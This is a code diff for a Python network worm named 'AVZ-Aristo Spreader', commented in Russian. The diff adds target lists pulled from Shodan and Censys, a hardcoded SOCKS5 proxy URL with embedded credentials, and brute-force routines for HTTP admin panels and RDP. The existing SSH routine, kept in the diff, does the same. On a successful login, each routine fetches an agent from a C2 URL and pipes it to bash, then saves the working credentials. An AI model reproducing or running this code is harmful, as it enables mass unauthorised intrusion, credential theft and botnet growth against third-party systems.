@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v26.7.1 – исправлен импорт shutil
+# AVZ-Aristo Spreader v26.8 – Shodan/Censys, HTTP‑брут, прокси
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, traceback, shutil
 from datetime import datetime, timezone, timedelta
 
@@ -60,6 +60,51 @@ def cache_port(ip, port):
     c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
     conn.commit()
 
+# Цели из Shodan/Censys
+SHODAN_API_KEY = ""
+CENSYS_API_ID = ""
+CENSYS_SECRET = ""
+try:
+    with open("secrets.json") as f:
+        s = json.load(f)
+        SHODAN_API_KEY = s.get("shodan_api_key", "")
+        CENSYS_API_ID = s.get("censys_api_id", "")
+        CENSYS_SECRET = s.get("censys_secret", "")
+except:
+    pass
+
+PROXY_URL = "socks5://3kBTM0Ya1FXxA7k:9e3c9b9c-1a11-4022-ad68-111eac0e7e21@budget.spyderproxy.com:11000"
+
+def fetch_external_ips(count=100):
+    ips = []
+    # Пробуем Shodan
+    if SHODAN_API_KEY:
+        try:
+            resp = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=port:22,445,3389,3306,6379,8080&limit={count}", timeout=10)
+            if resp.status_code == 200:
+                ips.extend([m['ip_str'] for m in resp.json().get('matches', [])])
+        except:
+            pass
+    # Пробуем Censys
+    if CENSYS_API_ID and CENSYS_SECRET:
+        try:
+            url = "https://search.censys.io/api/v2/hosts/search"
+            data = {"query": "services.service_name: SSH or RDP or HTTP", "per_page": count}
+            resp = requests.post(url, json=data, auth=(CENSYS_API_ID, CENSYS_SECRET), timeout=10)
+            if resp.status_code == 200:
+                ips.extend([h['ip'] for h in resp.json().get('result', {}).get('hits', [])])
+        except:
+            pass
+    # Fallback: бесплатный InternetDB Shodan
+    if not ips:
+        try:
+            resp = requests.get(f"https://internetdb.shodan.io/search?query=port:22,445,3389&limit={count}", timeout=10)
+            if resp.status_code == 200:
+                ips.extend(resp.json())
+        except:
+            pass
+    return ips
+
 GUARANTEED_IPS = [
     "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
     "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0"
@@ -72,7 +117,9 @@ def now_str():
     return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")
 
 def random_ip():
-    if random.random() < 0.5:
+    if hasattr(random_ip, "external_pool") and random_ip.external_pool and random.random() < 0.6:
+        return random.choice(random_ip.external_pool)
+    if random.random() < 0.3:
         return random.choice(GUARANTEED_IPS)
     while True:
         a = random.randint(1, 223)
@@ -83,7 +130,25 @@ def random_ip():
         if a == 172 and 16 <= b <= 31: continue
         if a == 192 and b == 168: continue
         if a >= 224: continue
-        return f"{a}.{b}.{c}.{d}"
+        ip = f"{a}.{b}.{c}.{d}"
+        if TARGET_COUNTRY:
+            if get_country(ip) == TARGET_COUNTRY:
+                return ip
+        else:
+            return ip
+
+def get_country(ip):
+    try:
+        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
+        if resp.status_code == 200:
+            return resp.json().get("countryCode", "")
+    except:
+        pass
+    return ""
+
+random_ip.external_pool = []
+def update_external_pool():
+    random_ip.external_pool = fetch_external_ips(100)
 
 def get_local_ips():
     try:
@@ -104,11 +169,9 @@ async def probe_port(ip, port):
     except:
         return False
 
-# ===== ЧИСТЫЙ ASYNCIO SSH =====
 async def ssh_brute(ip):
-    """SSH‑брутфорс без paramiko, использует sshpass"""
     if not shutil.which("sshpass"):
-        print(f"[{now_str()}] [ERROR] sshpass не установлен, SSH‑брутфорс невозможен", flush=True)
+        print(f"[{now_str()}] [ERROR] sshpass не установлен", flush=True)
         return False
     for u, p in (SUCCESS_CREDS + CREDS):
         cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o ServerAliveInterval=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
@@ -124,7 +187,54 @@ async def ssh_brute(ip):
             print(f"[{now_str()}] [ERROR] SSH {ip}:{u}:{p} – {e}", flush=True)
     return False
 
-# Остальные векторы без изменений (smb_brute, winrm_brute, ...), только добавлены try/except с выводом ошибок
+async def http_admin_brute(ip):
+    """Брутфорс HTTP Basic Auth / WordPress / phpMyAdmin / Tomcat"""
+    paths = [
+        "/", "/admin", "/wp-login.php", "/phpmyadmin", "/manager/html"
+    ]
+    headers = {"User-Agent": "Mozilla/5.0"}
+    for u, p in CREDS[:10]:
+        for path in paths:
+            url = f"http://{ip}{path}"
+            try:
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=3)) as s:
+                    async with s.get(url, auth=aiohttp.BasicAuth(u, p), headers=headers) as resp:
+                        if resp.status == 200:
+                            # Попытка загрузить агента через curl
+                            exploit_url = f"http://{ip}/cgi-bin/"
+                            async with s.get(exploit_url, auth=aiohttp.BasicAuth(u, p),
+                                             params={"cmd": f"wget -O- {AGENT_URL} | bash"}) as exp_resp:
+                                if exp_resp.status == 200:
+                                    save_success_creds(u, p)
+                                    return True
+            except:
+                pass
+    return False
+
+async def rdp_brute(ip):
+    if sys.platform != 'linux':
+        return False
+    if not shutil.which("xfreerdp"):
+        return False
+    for u, p in (SUCCESS_CREDS + CREDS[:15]):
+        cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
+        try:
+            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
+            await asyncio.wait_for(proc.communicate(), timeout=5)
+            if proc.returncode == 0:
+                await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
+                save_success_creds(u, p)
+                return True
+        except:
+            pass
+    return False
+
+def save_success_creds(username, password):
+    pair = [username, password]
+    if pair not in SUCCESS_CREDS:
+        SUCCESS_CREDS.append(pair)
+        with open(SUCCESS_CREDS_FILE, "w") as f:
+            json.dump(SUCCESS_CREDS, f)
 
 async def infect(ip, port_stats):
     ports = PORT_LIST
@@ -135,7 +245,12 @@ async def infect(ip, port_stats):
     if open_ports[1] and await ssh_brute(ip):
         print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
         return True
-    # ... остальные векторы
+    if (open_ports[3] or open_ports[4]) and await http_admin_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via HTTP", flush=True)
+        return True
+    if open_ports[8] and await rdp_brute(ip):
+        print(f"[{now_str()}] [INFECTED] {ip} via RDP", flush=True)
+        return True
     return False
 
 async def worker(queue, stats, port_stats, progress_cb=None):
@@ -203,6 +318,8 @@ async def main_async(args):
         print(f"[{now_str()}] [+] C2 reachable", flush=True)
     except Exception as e:
         print(f"[{now_str()}] [!] C2 unreachable: {e}", flush=True)
+
+    update_external_pool()
 
     targets = []
     if args.targets:
